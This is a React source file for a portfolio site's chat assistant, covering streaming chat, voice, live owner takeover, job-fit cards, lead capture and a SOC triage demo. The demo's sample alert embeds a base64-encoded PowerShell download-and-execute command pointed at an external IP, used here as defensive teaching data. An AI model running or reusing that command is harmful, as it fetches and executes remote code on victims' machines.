'use client'
import { useEffect, useRef, useState } from 'react'
import PwezaMark from './PwezaMark'
import Link from 'next/link'
import { usePathname, useRouter } from 'next/navigation'
import { useRole } from './roles'
import { projects } from '@/data/projects'

type ProofLink = { label: string; href: string }
type Source = { n: number; title: string; href: string }
type FitItem = { requirement: string; status: 'strong' | 'partial' | 'gap'; evidence: string; href?: string }
type Fit = { role: string; company?: string; score: number; summary: string; items: FitItem[]; strengths: string[]; gaps: string[] }
type Triage = { verdict: string; severity: 'Low' | 'Medium' | 'High' | 'Critical'; mitre: { id: string; name: string }[]; why: string[]; next: string[] }
type Card = { title: string; subtitle: string; href: string; image: string | null; status: string; stack: string[] }
type Msg = {
  role: 'user' | 'assistant' | 'joseph' | 'system'; content: string; links?: ProofLink[]; sources?: Source[]; fit?: Fit; checked?: boolean; streaming?: boolean; href?: string
  triage?: Triage; card?: Card; hrefLabel?: string; nav?: string | null; voice?: string; q?: string; vote?: 'up' | 'down'; jobPost?: string
}

// Same sample as the server's SAMPLE_ALERT: Word spawning hidden, encoded PowerShell that calls out to a Tor exit node.
const SAMPLE_ALERT = '2026-11-20T03:14:07Z host=WS-0142 user=jdoe EventID=4688 process=powershell.exe parent=winword.exe cmdline="powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMgAyADAALgAxADAAMQAuADQAMgAvAGEAJwApAA==" dest_ip=185.220.101.42'

/** Backup voice: the browser's own speech, used only if PWEZA's voice can't be fetched. */
function browserSpeak(text: string, onEnd: () => void) {
  try {
    const synth = window.speechSynthesis
    if (!synth) return onEnd()
    synth.cancel()
    const u = new SpeechSynthesisUtterance(text.replace(/\s*\[\d+\]/g, '').slice(0, 900))
    const voices = synth.getVoices()
    u.voice = voices.find((v) => /Christopher|Guy|Daniel|Alex|Google UK English Male/i.test(v.name)) || voices.find((v) => v.lang.startsWith('en')) || null
    u.rate = 0.98; u.pitch = 0.85
    u.onend = onEnd; u.onerror = onEnd
    synth.speak(u)
  } catch { onEnd() }
}

/** The tracker's long-lived visitor id (for "welcome back" memory). */
function visitorId(): string {
  try { return JSON.parse(localStorage.getItem('pa-visitor') || 'null')?.id || '' } catch { return '' }
}


/** Renders "[2]" citations as small links to the passage PWEZA used. */
function withCitations(text: string, sources: Source[] | undefined, onNav: () => void) {
  if (!sources?.length) return text.replace(/\s*\[\d+\]/g, '')
  const parts = text.split(/(\[\d+\])/g)
  return parts.map((part, i) => {
    const m = part.match(/^\[(\d+)\]$/)
    const src = m ? sources.find((x) => x.n === Number(m[1])) : undefined
    if (!m) return <span key={i}>{part}</span>
    if (!src) return null
    return <Link key={i} href={src.href} onClick={onNav} className="pz-cite" title={src.title} aria-label={`Source: ${src.title}`}>{m[1]}</Link>
  })
}

const FIT_LABEL = { strong: 'Strong', partial: 'Partial', gap: 'Gap' } as const

/** Same visit ID the tracker uses, so Joseph can take over this chat from Telegram. */
function chatSid(): string {
  try {
    const v = JSON.parse(sessionStorage.getItem('pa-visit') || 'null')
    if (v?.sid) return v.sid
    let own = sessionStorage.getItem('pz-sid')
    if (!own) { own = Math.random().toString(36).slice(2, 12) + Date.now().toString(36); sessionStorage.setItem('pz-sid', own) }
    return own
  } catch { return '' }
}

const GREETING: Msg = {
  role: 'assistant',
  content: "Hi, I'm PWEZA, Joseph's portfolio assistant. I only answer from what's verified on this site, and I'll link you to the proof.",
}

const SUGGESTIONS: Record<string, string[]> = {
  default: ['Is he a fit for SOC roles?', 'What did he build on AWS?', 'What certifications does he have?', 'How do I contact him?'],
  recruiter: ['Is he available now?', 'What certifications does he have?', 'What are his main projects?', 'How do I contact him?'],
  soc: ['Is he a fit for SOC roles?', 'Tell me about BLUE SOC', 'What SOC skills has he used?', 'Does he have PSAA?'],
  engineer: ['What did he build on AWS?', 'Tell me about BLUE-X', 'Is he qualified for cloud security?', 'What are his skills?'],
}

/** PWEZA: verified-facts portfolio assistant. Text chat, optional voice in/out, proof links. */
export default function AIChat() {
  const role = useRole()
  const [hidden, setHidden] = useState(false)
  useEffect(() => { setHidden(window.location.pathname.startsWith('/tg/')) }, [])
  const [open, setOpen] = useState(false)
  const [visible, setVisible] = useState(false)
  const [messages, setMessages] = useState<Msg[]>([GREETING])
  const [input, setInput] = useState('')
  const [loading, setLoading] = useState(false)
  const [voiceOut, setVoiceOut] = useState(false)
  const [listening, setListening] = useState(false)
  const [canListen, setCanListen] = useState(false)
  const listRef = useRef<HTMLDivElement>(null)
  const inputRef = useRef<HTMLInputElement>(null)
  const audioRef = useRef<HTMLAudioElement | null>(null)
  const recRef = useRef<any>(null)
  const [live, setLive] = useState(false)
  const liveAfter = useRef(0)
  const wasLive = useRef(false)
  const sayRef = useRef<((t: string) => void) | null>(null)
  const pathname = usePathname() || '/'
  const router = useRouter()
  const [online, setOnline] = useState(false)
  const [interview, setInterview] = useState(false)
  const [full, setFull] = useState(false)
  const [talk, setTalk] = useState(false)
  const talkRef = useRef(false)
  const [smart, setSmart] = useState<string[]>([])
  const [leadOpen, setLeadOpen] = useState(false)
  const [leadSent, setLeadSent] = useState(false)
  const [cvBusy, setCvBusy] = useState(false)
  const [nudge, setNudge] = useState(false)
  const greeted = useRef(false)
  const projectId = pathname.match(/^\/projects\/([^/#?]+)/)?.[1]
  const pageProject = projectId ? projects.find((p) => p.id === projectId) : undefined

  // Joseph can take over from Telegram: poll for his messages while the chat is open (or he's live).
  useEffect(() => {
    if (!open && !live) return
    let stop = false
    const tick = async () => {
      const sid = chatSid()
      if (!sid || stop) return
      try {
        const r = await fetch(`/api/chat/live?sid=${encodeURIComponent(sid)}&after=${liveAfter.current}`, { cache: 'no-store' })
        const d = await r.json()
        liveAfter.current = d.next ?? liveAfter.current
        const incoming: Msg[] = []
        for (const m of d.messages || []) {
          if (m.t === '__joined__') incoming.push({ role: 'system', content: 'Joseph joined the chat 👋' })
          else if (m.t === '__handback__') incoming.push({ role: 'system', content: 'Joseph handed you back to PWEZA.' })
          else if (typeof m.t === 'string' && m.t.startsWith('__voice__:')) incoming.push({ role: 'joseph', content: '🎙 Voice message', voice: `/api/chat/voice/${m.t.slice(10)}` })
          else incoming.push({ role: 'joseph', content: m.t })
        }
        if (typeof d.online === 'boolean') setOnline(d.online)
        if (incoming.length) {
          setMessages((cur) => [...cur, ...incoming]); setOpen(true)
          // Hands-free mode: read Joseph's live messages aloud too.
          const said = incoming.filter((m) => m.role === 'joseph' && !m.voice).map((m) => m.content).join(' ')
          if (talkRef.current && said) sayRef.current?.(`Joseph says: ${said}`)
        }
        if (!!d.live !== wasLive.current) { wasLive.current = !!d.live; setLive(!!d.live) }
      } catch { /* try again next tick */ }
    }
    tick()
    const t = setInterval(tick, live ? 2500 : 5000)
    return () => { stop = true; clearInterval(t) }
  }, [open, live])

  // Show the launcher after the hero, hide it over the footer
  useEffect(() => {
    const onScroll = () => {
      const f = document.getElementById('contact')
      const nearFooter = !!f && f.getBoundingClientRect().top < window.innerHeight
      setVisible(window.scrollY > window.innerHeight * 0.5 && !nearFooter)
    }
    onScroll()
    window.addEventListener('scroll', onScroll, { passive: true })
    setCanListen('webkitSpeechRecognition' in window || 'SpeechRecognition' in window)
    return () => window.removeEventListener('scroll', onScroll)
  }, [])

  // 👋 First open: welcome back returning visitors; on a project page, offer to walk them through it.
  useEffect(() => {
    if (!open || greeted.current) return
    greeted.current = true
    if (pageProject) setMessages((m) => [...m, { role: 'assistant', content: `You're looking at ${pageProject.title}. Want the 60-second version, the architecture, or how it maps to a real SOC job?` }])
    const vid = visitorId()
    if (!vid) return
    fetch(`/api/chat/memory?vid=${encodeURIComponent(vid)}`, { cache: 'no-store' }).then((r) => r.json()).then((d) => {
      const mem = d?.memory
      if (!mem?.last) return
      const topic = mem.topics?.[0]
      setMessages((m) => [...m, { role: 'assistant', content: `Welcome back. Last time you asked “${String(mem.last).slice(0, 90)}”.${topic ? ` Want to pick up on ${topic}?` : ' Want to pick up where we left off?'}` }])
    }).catch(() => {})
  }, [open, pageProject])

  // A quiet nudge on project pages after a while, never more than once per visit.
  useEffect(() => {
    setNudge(false)
    if (!pageProject) return
    let seen = false
    try { seen = sessionStorage.getItem('pz-nudged') === '1' } catch {}
    if (seen) return
    const t = setTimeout(() => { if (!open) { setNudge(true); try { sessionStorage.setItem('pz-nudged', '1') } catch {} } }, 25_000)
    return () => clearTimeout(t)
  }, [pathname, pageProject, open])
  useEffect(() => { if (open) setNudge(false) }, [open])

  useEffect(() => { listRef.current?.scrollTo({ top: listRef.current.scrollHeight, behavior: 'smooth' }) }, [messages, loading])
  useEffect(() => { if (open) setTimeout(() => inputRef.current?.focus(), 150) }, [open])
  useEffect(() => {
    const onKey = (e: KeyboardEvent) => { if (e.key === 'Escape') setOpen(false) }
    window.addEventListener('keydown', onKey)
    return () => window.removeEventListener('keydown', onKey)
  }, [])
  useEffect(() => {
    const toggle = () => setOpen((o) => !o)
    window.addEventListener('pweza:toggle', toggle)
    return () => window.removeEventListener('pweza:toggle', toggle)
  }, [])
  useEffect(() => { if (!open) { try { window.speechSynthesis?.cancel() } catch {} audioRef.current?.pause(); recRef.current?.stop?.(); talkRef.current = false; setTalk(false); setFull(false) } }, [open])

  const send = async (text: string, opts: { mode?: 'demo'; label?: string } = {}) => {
    const q = text.trim()
    if (!q || loading) return
    setSmart([])
    const next: Msg[] = [...messages, { role: 'user', content: opts.label || q }]
    setMessages(next)
    setInput('')
    setLoading(true)
    window.dispatchEvent(new Event('pweza-asked'))
    try {
      const res = await fetch('/api/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          messages: next.slice(1).map((m, i, arr) => (i === arr.length - 1 && opts.label ? { ...m, content: q } : m)).filter((m) => m.role === 'user' || m.role === 'assistant' || m.role === 'joseph').map(({ role, content }) => ({ role: role === 'joseph' ? 'assistant' : role, content: content.replace(/\s*\[\d+\]/g, '') })),
          wantsAudio: voiceOut || talkRef.current,
          sid: chatSid(),
          stream: true,
          mode: opts.mode || (interview ? 'interview' : undefined),
          vid: visitorId() || undefined,
          visitorRole: role || undefined,
          page: pathname,
        }),
      })
      const playAudio = async (audio?: string | null, text?: string) => {
        if (!(voiceOut || talkRef.current)) return
        if (!audio && text) {
          try { audio = (await fetch('/api/chat/speak', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ text }) }).then((r) => r.json())).audio } catch { /* fall through */ }
        }
        if (!audio) {
          const resume = () => { if (talkRef.current) setTimeout(() => listen(true), 300) }
          return text ? browserSpeak(text, resume) : resume()
        }
        audioRef.current?.pause()
        audioRef.current = new Audio(audio)
        // Hands-free talk mode: when PWEZA finishes speaking, listen again.
        audioRef.current.onended = () => { if (talkRef.current) listen(true) }
        audioRef.current.play().catch(() => { if (talkRef.current) listen(true) })
      }
      // Streaming answer: words appear as PWEZA writes them; the fact-checker may refine the text at the end.
      if ((res.headers.get('content-type') || '').includes('ndjson') && res.body) {
        const reader = res.body.getReader()
        const dec = new TextDecoder()
        let buf = '', started = false, spoken = ''
        const patch = (fn: (m: Msg) => Msg) => setMessages((cur) => { const copy = cur.slice(); copy[copy.length - 1] = fn(copy[copy.length - 1]); return copy })
        const begin = () => { if (!started) { started = true; setLoading(false); setMessages((cur) => [...cur, { role: 'assistant', content: '', streaming: true }]) } }
        for (;;) {
          const { done, value } = await reader.read()
          if (done) break
          buf += dec.decode(value, { stream: true })
          const lines = buf.split('\n')
          buf = lines.pop() || ''
          for (const line of lines) {
            if (!line.trim()) continue
            let ev: any
            try { ev = JSON.parse(line) } catch { continue }
            if (ev.type === 'meta') { begin(); patch((m) => ({ ...m, sources: ev.sources, card: ev.card, q })) }
            else if (ev.type === 'delta') { begin(); spoken += ev.t; patch((m) => ({ ...m, content: m.content + ev.t })) }
            else if (ev.type === 'replace') { begin(); spoken = ev.t; patch((m) => ({ ...m, content: ev.t, checked: !!ev.checked })) }
            else if (ev.type === 'done') {
              begin(); patch((m) => ({ ...m, links: ev.links, nav: ev.nav, streaming: false, q }))
              if (Array.isArray(ev.suggestions)) setSmart(ev.suggestions.slice(0, 3))
              if (ev.hiring) setLeadOpen(true)
              playAudio(ev.audio, spoken)
            }
          }
        }
        if (started) patch((m) => ({ ...m, streaming: false }))
        return
      }
      const data = await res.json()
      if (data.live) { setLive(true); wasLive.current = true; if (talkRef.current) setTimeout(() => listen(true), 400); return } // Joseph will answer himself
      const reply = data.content || data.error || "I couldn't answer that right now. You can email Joseph at kamarajosephallan@gmail.com."
      setMessages((m) => [...m, { role: 'assistant', content: reply, links: data.links, fit: data.fit, triage: data.triage, q, jobPost: data.fit ? q : undefined }])
      playAudio(data.audio, reply)
    } catch {
      setMessages((m) => [...m, { role: 'assistant', content: "Connection problem. Try again, or email kamarajosephallan@gmail.com." }])
    } finally {
      setLoading(false)
    }
  }

  // 📎 Turn this conversation (and any job fit) into a page the visitor can forward to their hiring team.
  const [briefing, setBriefing] = useState(false)
  const createBrief = async () => {
    if (briefing) return
    setBriefing(true)
    const qa: { q: string; a: string }[] = []
    let fit: Fit | undefined
    messages.forEach((m, i) => {
      if (m.fit) fit = m.fit
      if (m.role === 'user') {
        const a = messages.slice(i + 1).find((x) => x.role === 'assistant' || x.role === 'joseph')
        if (a && !a.fit && !m.content.startsWith('[') && m.content.length < 600) qa.push({ q: m.content, a: a.content })
      }
    })
    try {
      const r = await fetch('/api/brief', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sid: chatSid(), qa, fit }) })
      const d = await r.json()
      setMessages((cur) => [...cur, d.url
        ? { role: 'system', content: 'Your briefing is ready to share: open it, then copy the link or print to PDF.', href: d.url }
        : { role: 'system', content: "Couldn't create the briefing right now. Try again in a moment." }])
    } catch {
      setMessages((cur) => [...cur, { role: 'system', content: "Couldn't create the briefing right now." }])
    } finally { setBriefing(false) }
  }
  const answered = messages.filter((m) => m.role === 'assistant' && m !== messages[0]).length
  const canBrief = messages.some((m) => m.fit) || answered >= 2

  function listen(auto = false) {
    const SR = (window as any).webkitSpeechRecognition || (window as any).SpeechRecognition
    if (!SR) return
    if (auto && !talkRef.current) return
    if (listening && !auto) { recRef.current?.stop(); return }
    const r = new SR()
    r.lang = 'en-US'
    r.interimResults = false
    r.onstart = () => setListening(true)
    r.onend = () => setListening(false)
    r.onerror = () => setListening(false)
    r.onresult = (e: any) => {
      const said = e.results?.[0]?.[0]?.transcript ?? ''
      if (said) { if (!talkRef.current) setVoiceOut(true); send(said) }
    }
    recRef.current = r
    try { r.start() } catch { /* already listening */ }
  }
  sayRef.current = async (text: string) => {
    try {
      recRef.current?.stop?.()
      const { audio } = await fetch('/api/chat/speak', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ text }) }).then((r) => r.json())
      if (!audio) return browserSpeak(text, () => { if (talkRef.current) listen(true) })
      audioRef.current?.pause()
      audioRef.current = new Audio(audio)
      audioRef.current.onended = () => { if (talkRef.current) listen(true) }
      await audioRef.current.play()
    } catch { if (talkRef.current) listen(true) }
  }
  const toggleTalk = () => {
    const on = !talkRef.current
    talkRef.current = on; setTalk(on)
    if (on) { setFull(true); listen(true) } else { recRef.current?.stop?.(); audioRef.current?.pause() }
  }

  const rate = (i: number, vote: 'up' | 'down') => {
    const m = messages[i]
    if (!m || m.vote) return
    setMessages((cur) => cur.map((x, k) => (k === i ? { ...x, vote } : x)))
    fetch('/api/chat/feedback', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ vote, q: m.q || '', a: m.content.slice(0, 1500), sid: chatSid() }) }).catch(() => {})
  }

  const sendLead = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault()
    const f = new FormData(e.currentTarget)
    if (!f.get('consent')) return
    try {
      const r = await fetch('/api/lead', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email: f.get('email'), name: f.get('name'), company: f.get('company'), note: f.get('note'), consent: true, sid: chatSid() }) })
      const d = await r.json()
      setLeadSent(true); setLeadOpen(false)
      if (d.ok && d.book) { setMessages((cur) => [...cur, { role: 'system', content: 'Sent. Joseph got your details on his phone. Want to skip the back-and-forth? Book a time on his calendar.', href: d.book, hrefLabel: '📅 Pick a time' }]); return }
      setMessages((cur) => [...cur, { role: 'system', content: d.ok ? 'Sent. Joseph got your details on his phone and will reply by email.' : d.error === 'invalid' ? 'That email doesn\'t look right. Try again?' : 'Couldn\'t send that right now. You can email kamarajosephallan@gmail.com.' }])
      if (!d.ok && d.error === 'invalid') { setLeadSent(false); setLeadOpen(true) }
    } catch { setMessages((cur) => [...cur, { role: 'system', content: 'Couldn\'t send that right now. You can email kamarajosephallan@gmail.com.' }]) }
  }

  const tailorCv = async (target: string) => {
    if (cvBusy) return
    setCvBusy(true)
    try {
      const r = await fetch('/api/resume/tailor', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ target, sid: chatSid() }) })
      const d = await r.json()
      setMessages((cur) => [...cur, d.url
        ? { role: 'system', content: `A one-page résumé tailored to ${d.role} is ready. Every line comes from verified facts.`, href: d.url, hrefLabel: '📄 Open résumé' }
        : { role: 'system', content: d.error === 'slow-down' ? 'One moment, then try again.' : "Couldn't build the tailored résumé right now. The standard one is in the links above." }])
    } catch { setMessages((cur) => [...cur, { role: 'system', content: "Couldn't build the tailored résumé right now." }]) }
    finally { setCvBusy(false) }
  }

  const goTo = (href: string) => {
    const [path, hash] = href.split('#')
    if (!full) setOpen(false)
    if ((path || '/') === pathname && hash) {
      const el = document.getElementById(hash)
      el?.scrollIntoView({ behavior: 'smooth', block: 'start' })
      el?.classList.add('pz-highlight'); setTimeout(() => el?.classList.remove('pz-highlight'), 2600)
    } else router.push(href)
  }

  const base = pageProject
    ? [`Explain ${pageProject.title} in 60 seconds`, `What was hard about ${pageProject.title}?`, 'Is he a fit for SOC roles?']
    : interview ? ['Tell me about a time he handled an incident', 'Describe a project he is proud of', 'How does he learn new tools?']
    : SUGGESTIONS[role ?? 'default'] ?? SUGGESTIONS.default
  const suggestions = smart.length ? smart : base
  const asked = new Set(messages.filter((m) => m.role === 'user').map((m) => m.content))

  if (hidden) return null
  return (
    <>
      <button
        type="button"
        onClick={() => setOpen((o) => !o)}
        aria-expanded={open}
        aria-controls="pweza-panel"
        tabIndex={visible || open ? 0 : -1}
        className={`pz-launch ${visible || open ? 'is-on' : ''}`}
      >
        <PwezaMark size={28} />
        {open ? 'Close' : 'Ask my AI assistant'}
        {online && !open && <span className="pz-online-dot" aria-label="Joseph is online" />}
      </button>
      {nudge && !open && pageProject && (
        <button type="button" className="pz-nudge" onClick={() => setOpen(true)}>
          Questions about {pageProject.title}? Ask PWEZA <span aria-hidden>→</span>
        </button>
      )}

      <section id="pweza-panel" aria-label="PWEZA assistant" className={`pz-panel ${open ? 'is-open' : ''} ${full ? 'is-full' : ''}`} aria-hidden={!open}>
        <header className="flex items-center justify-between gap-3 border-b border-line px-5 py-4">
          <div className="flex items-center gap-3">
            <PwezaMark size={36} />
            <div>
              <p className="text-[15px] font-semibold text-snow">PWEZA {interview && <span className="pz-mode-tag">Interview</span>}</p>
              <p className="text-[12px] text-smoke">{online ? <span className="pz-online"><i /> Joseph is online</span> : 'Verified answers only'}</p>
            </div>
          </div>
          <div className="flex items-center gap-1">
            <button type="button" onClick={() => { setInterview((v) => !v); setSmart([]) }} aria-pressed={interview} className={`pz-icon ${interview ? 'is-on' : ''}`} title={interview ? 'Interview mode on: answers in STAR form' : 'Interview mode: ask interview questions, get STAR answers'}>
              <svg aria-hidden viewBox="0 0 24 24" className="h-[18px] w-[18px]" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round"><path d="M4 5h16v11H8l-4 4z" /><path d="M8 9h8M8 12h5" /></svg>
              <span className="sr-only">{interview ? 'Turn interview mode off' : 'Turn interview mode on'}</span>
            </button>
            {canListen && (
              <button type="button" onClick={toggleTalk} aria-pressed={talk} className={`pz-icon ${talk ? 'is-on' : ''}`} title={talk ? 'End hands-free conversation' : 'Talk hands-free'}>
                <svg aria-hidden viewBox="0 0 24 24" className="h-[18px] w-[18px]" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round"><path d="M4 12h1M8 8v8M12 5v14M16 8v8M20 12h-1" /></svg>
                <span className="sr-only">{talk ? 'End hands-free conversation' : 'Start hands-free conversation'}</span>
              </button>
            )}
            <button type="button" onClick={() => setFull((v) => !v)} aria-pressed={full} className="pz-icon pz-full-btn" title={full ? 'Exit full screen' : 'Full screen'}>
              <svg aria-hidden viewBox="0 0 24 24" className="h-[18px] w-[18px]" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round">{full ? <path d="M9 4v5H4M15 4v5h5M9 20v-5H4M15 20v-5h5" /> : <path d="M4 9V4h5M20 9V4h-5M4 15v5h5M20 15v5h-5" />}</svg>
              <span className="sr-only">{full ? 'Exit full screen' : 'Full screen'}</span>
            </button>
            <button type="button" onClick={() => { setVoiceOut((v) => !v); audioRef.current?.pause() }} aria-pressed={voiceOut} className="pz-icon" title={voiceOut ? 'Voice replies on' : 'Voice replies off'}>
              <svg aria-hidden viewBox="0 0 24 24" className="h-[18px] w-[18px]" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round">
                <path d="M4 9v6h4l5 4V5L8 9z" />
                {voiceOut ? <path d="M16 9a4 4 0 010 6M18.5 6.5a8 8 0 010 11" /> : <path d="M17 9l4 6M21 9l-4 6" />}
              </svg>
              <span className="sr-only">{voiceOut ? 'Turn voice replies off' : 'Turn voice replies on'}</span>
            </button>
            <button type="button" onClick={() => setOpen(false)} className="pz-icon" aria-label="Close assistant">
              <svg aria-hidden viewBox="0 0 24 24" className="h-[18px] w-[18px]" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round"><path d="M6 6l12 12M18 6L6 18" /></svg>
            </button>
          </div>
        </header>

        {talk && (
          <div className="pz-talk" role="status">
            <div className={`pz-talk-orb ${listening ? 'is-listening' : loading ? 'is-thinking' : 'is-speaking'}`} aria-hidden><i /><i /><i /></div>
            <p>{listening ? 'Listening…' : loading ? 'Thinking…' : 'Speaking… just talk when it finishes'}</p>
            <button type="button" onClick={toggleTalk} className="pz-chip">End conversation</button>
          </div>
        )}
        <div ref={listRef} className="pz-list" aria-live="polite">
          {messages.map((m, i) => (
            <div key={i} className={m.role === 'user' ? 'pz-msg pz-user' : m.role === 'joseph' ? 'pz-msg pz-bot pz-joseph' : m.role === 'system' ? 'pz-system' : 'pz-msg pz-bot'}>
              {m.role === 'joseph' && <span className="pz-joseph-name"><img src="/profile/joseph-cutout.webp" alt="" className="pz-joseph-avatar" /> Joseph</span>}
              {m.role === 'system' && m.href ? (
                <p>{m.content} <a href={m.href} target="_blank" rel="noopener" className="pz-proof">{m.hrefLabel || 'Open briefing'}</a></p>
              ) : (
                <p className={m.streaming ? 'pz-streaming' : undefined}>{m.role === 'assistant' ? withCitations(m.content, m.sources, () => setOpen(false)) : m.content}</p>
              )}
              {m.voice && <audio controls preload="none" src={m.voice} className="pz-voice" />}
              {m.card && (
                <button type="button" onClick={() => goTo(m.card!.href)} className="pz-card">
                  {m.card.image && <img src={m.card.image} alt="" loading="lazy" />}
                  <span><b>{m.card.title}</b><em>{m.card.subtitle}</em><small>{m.card.stack.join(' · ')}</small></span>
                </button>
              )}
              {m.triage && (
                <div className="pz-triage">
                  <div className="pz-triage-head"><span className={`sev sev-${m.triage.severity.toLowerCase()}`}>{m.triage.severity}</span><b>{m.triage.verdict}</b></div>
                  {!!m.triage.mitre.length && <div className="pz-triage-mitre">{m.triage.mitre.map((t) => <a key={t.id} href={`https://attack.mitre.org/techniques/${t.id.replace('.', '/')}/`} target="_blank" rel="noopener">{t.id} · {t.name}</a>)}</div>}
                  <p className="pz-triage-label">Why</p><ul>{m.triage.why.map((w, k) => <li key={k}>{w}</li>)}</ul>
                  <p className="pz-triage-label">Next steps</p><ol>{m.triage.next.map((w, k) => <li key={k}>{w}</li>)}</ol>
                  <p className="pz-triage-note">Educational demo of Joseph&apos;s BLUE SOC reasoning, not a live investigation.</p>
                </div>
              )}
              {m.checked && <span className="pz-checked" title="PWEZA's fact-checker refined this answer against the site">✓ fact-checked</span>}
              {m.fit && (
                <div className="pz-fit">
                  <div className="pz-fit-head">
                    <div><b>{m.fit.company ? `${m.fit.company} · ` : ''}{m.fit.role}</b><span>{m.fit.summary}</span></div>
                    <div className="pz-fit-score" style={{ ['--fit' as any]: `${m.fit.score * 3.6}deg` }}><i>{m.fit.score}</i></div>
                  </div>
                  <ul>
                    {m.fit.items.map((it, k) => (
                      <li key={k}>
                        <span className={`pz-fit-pill ${it.status}`}>{FIT_LABEL[it.status]}</span>
                        <span className="pz-fit-req">{it.requirement}</span>
                        <span className="pz-fit-ev">{it.href ? <Link href={it.href} onClick={() => setOpen(false)}>{it.evidence}</Link> : it.evidence}</span>
                      </li>
                    ))}
                  </ul>
                  {m.jobPost && (
                    <button type="button" onClick={() => tailorCv(m.jobPost!)} disabled={cvBusy} className="pz-brief-btn">{cvBusy ? 'Tailoring résumé…' : '📄 Get a résumé tailored to this role'}</button>
                  )}
                </div>
              )}
              {!!m.links?.length && (
                <div className="mt-2.5 flex flex-wrap gap-1.5">
                  {m.links.map((l) =>
                    l.href.startsWith('/') && !l.href.endsWith('.pdf') ? (
                      <Link key={l.href} href={l.href} onClick={() => setOpen(false)} className="pz-proof">{l.label}</Link>
                    ) : (
                      <a key={l.href} href={l.href} target={l.href.startsWith('mailto') ? undefined : '_blank'} rel="noopener" className="pz-proof">{l.label}</a>
                    ),
                  )}
                </div>
              )}
              {m.role === 'assistant' && m.nav && !m.streaming && (
                <button type="button" onClick={() => goTo(m.nav!)} className="pz-proof pz-goto">Show me on the site →</button>
              )}
              {m.role === 'assistant' && i > 0 && !m.streaming && m.q && (
                <div className="pz-rate" aria-label="Rate this answer">
                  {m.vote ? <span>{m.vote === 'up' ? 'Thanks!' : 'Thanks, Joseph will improve this.'}</span> : (
                    <>
                      <button type="button" onClick={() => rate(i, 'up')} aria-label="Helpful">👍</button>
                      <button type="button" onClick={() => rate(i, 'down')} aria-label="Not helpful">👎</button>
                    </>
                  )}
                </div>
              )}
            </div>
          ))}
          {leadOpen && !leadSent && (
            <form className="pz-lead" onSubmit={sendLead}>
              <p><b>Want Joseph to follow up?</b> Leave your email and he gets it on his phone right away.</p>
              <input name="email" type="email" required placeholder="you@company.com" className="pz-input" autoComplete="email" />
              <div className="pz-lead-row">
                <input name="name" placeholder="Name (optional)" className="pz-input" autoComplete="name" />
                <input name="company" placeholder="Company (optional)" className="pz-input" autoComplete="organization" />
              </div>
              <input name="note" placeholder="Role or note (optional)" className="pz-input" maxLength={300} />
              <label className="pz-consent"><input type="checkbox" name="consent" required /> Share these details with Joseph so he can contact me. <Link href="/privacy" onClick={() => setOpen(false)}>Privacy</Link></label>
              <div className="pz-lead-row"><button type="submit" className="pz-brief-btn">Send to Joseph</button><button type="button" className="pz-chip" onClick={() => setLeadOpen(false)}>Not now</button></div>
            </form>
          )}
          {canBrief && !loading && !live && (
            <button type="button" onClick={createBrief} disabled={briefing} className="pz-brief-btn">
              {briefing ? 'Creating briefing…' : '📎 Share this with your hiring team'}
            </button>
          )}
          {loading && (
            <div className="pz-msg pz-bot" aria-label="PWEZA is typing">
              <span className="pz-typing"><i /><i /><i /></span>
            </div>
          )}
        </div>

        <div className="flex gap-2 overflow-x-auto px-4 pb-2 pt-1">
          {suggestions.filter((s) => !asked.has(s)).map((s) => (
            <button key={s} type="button" onClick={() => send(s)} className={`pz-chip ${smart.length ? 'is-smart' : ''}`}>{s}</button>
          ))}
          {!asked.has('🧪 Triage demo: sample alert') && (
            <button type="button" onClick={() => send(SAMPLE_ALERT, { mode: 'demo', label: '🧪 Triage demo: sample alert' })} className="pz-chip">🧪 Try a triage demo</button>
          )}
          {!leadOpen && !leadSent && answered >= 2 && (
            <button type="button" onClick={() => setLeadOpen(true)} className="pz-chip">📇 Have Joseph contact me</button>
          )}
        </div>

        <form onSubmit={(e) => { e.preventDefault(); send(input) }} className="flex items-center gap-2 border-t border-line p-3">
          <label htmlFor="pz-input" className="sr-only">Ask about Joseph</label>
          <input id="pz-input" ref={inputRef} value={input} onChange={(e) => setInput(e.target.value)} placeholder={interview ? 'Ask an interview question' : 'Ask, or paste a job post or an alert'} className="pz-input" maxLength={6000} autoComplete="off" />
          {canListen && (
            <button type="button" onClick={() => listen()} className={`pz-icon ${listening ? 'is-live' : ''}`} aria-pressed={listening} aria-label={listening ? 'Stop listening' : 'Ask by voice'}>
              <svg aria-hidden viewBox="0 0 24 24" className="h-[18px] w-[18px]" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" strokeLinejoin="round">
                <rect x="9" y="3" width="6" height="11" rx="3" /><path d="M5 11a7 7 0 0014 0M12 18v3" />
              </svg>
            </button>
          )}
          <button type="submit" disabled={!input.trim() || loading} className="pz-send" aria-label="Send">
            <svg aria-hidden viewBox="0 0 24 24" className="h-[18px] w-[18px]" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M5 12h14M13 6l6 6-6 6" /></svg>
          </button>
        </form>
        <p className="pz-secure"><Link href="/ai-security" onClick={() => setOpen(false)}>🛡 How PWEZA is secured</Link></p>
      </section>
    </>
  )
}
